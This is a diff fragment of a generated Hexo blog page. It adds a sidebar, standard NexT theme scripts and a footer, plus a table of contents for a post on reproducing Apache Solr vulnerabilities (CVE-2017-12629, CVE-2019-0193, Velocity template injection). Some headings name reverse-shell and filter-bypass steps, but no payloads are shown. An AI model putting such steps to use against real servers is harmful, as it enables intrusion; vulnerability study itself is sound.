+                    <a href="https://adad456.github.io" title="拾柒" target="_blank">拾柒</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Apache-Solr系列漏洞复现"><span class="nav-number">1.</span> <span class="nav-text">Apache Solr系列漏洞复现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2017-12629-RCE-XXE"><span class="nav-number">2.</span> <span class="nav-text">CVE-2017-12629-RCE+XXE</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞描述"><span class="nav-number">2.1.</span> <span class="nav-text">漏洞描述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#影响版本"><span class="nav-number">2.2.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞环境"><span class="nav-number">2.3.</span> <span class="nav-text">漏洞环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞复现"><span class="nav-number">2.4.</span> <span class="nav-text">漏洞复现</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#XXE漏洞"><span class="nav-number">2.4.1.</span> <span class="nav-text">XXE漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#RCE复现"><span class="nav-number">2.4.2.</span> <span class="nav-text">RCE复现</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#执行命令创建一个文件"><span class="nav-number">2.4.2.1.</span> <span class="nav-text">执行命令创建一个文件</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#反弹shell-perl"><span class="nav-number">2.4.2.2.</span> <span class="nav-text">反弹shell(perl)</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#反弹shell-bash"><span class="nav-number">2.4.2.3.</span> <span class="nav-text">反弹shell(bash)</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考"><span class="nav-number">2.5.</span> <span class="nav-text">参考</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Apache-Solr远程代码执行漏洞-CVE-2019-0193-Exploit"><span class="nav-number">3.</span> <span class="nav-text">Apache Solr远程代码执行漏洞(CVE-2019-0193) Exploit</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞描述-1"><span class="nav-number">3.1.</span> <span class="nav-text">漏洞描述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞环境-1"><span class="nav-number">3.2.</span> <span class="nav-text">漏洞环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞复现-1"><span class="nav-number">3.3.</span> <span class="nav-text">漏洞复现</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#创建文件"><span class="nav-number">3.3.1.</span> <span class="nav-text">创建文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#反弹shell-反弹时可能会等几秒"><span class="nav-number">3.3.2.</span> <span class="nav-text">反弹shell(反弹时可能会等几秒)</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#bash反弹shell-经过base64编码后即可反弹"><span class="nav-number">3.3.2.1.</span> <span class="nav-text">bash反弹shell(经过base64编码后即可反弹)</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#perl反弹-远程加载反弹，-绕过后台函数不允许直接传管道符的限制"><span class="nav-number">3.3.2.2.</span> <span class="nav-text">perl反弹(远程加载反弹，$@绕过后台函数不允许直接传管道符的限制)</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考-1"><span class="nav-number">3.4.</span> <span class="nav-text">参考</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Apache-Solr-Velocity模版注入远程命令执行漏洞"><span class="nav-number">4.</span> <span class="nav-text">Apache Solr Velocity模版注入远程命令执行漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞描述-2"><span class="nav-number">4.1.</span> <span class="nav-text">漏洞描述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#影响版本-1"><span class="nav-number">4.2.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用"><span class="nav-number">4.3.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#修复建议"><span class="nav-number">4.4.</span> <span class="nav-text">修复建议</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考-2"><span class="nav-number">4.5.</span> <span class="nav-text">参考</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Demos</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">87.6k</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共87.6k字</span>
+</div>
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  <!-- 代码块复制功能 -->
+  <script type="text/javascript" src="/js/src/clipboard.min.js"></script>  
+  <script type="text/javascript" src="/js/src/clipboard-use.js"></script>
+</body>
+</html>
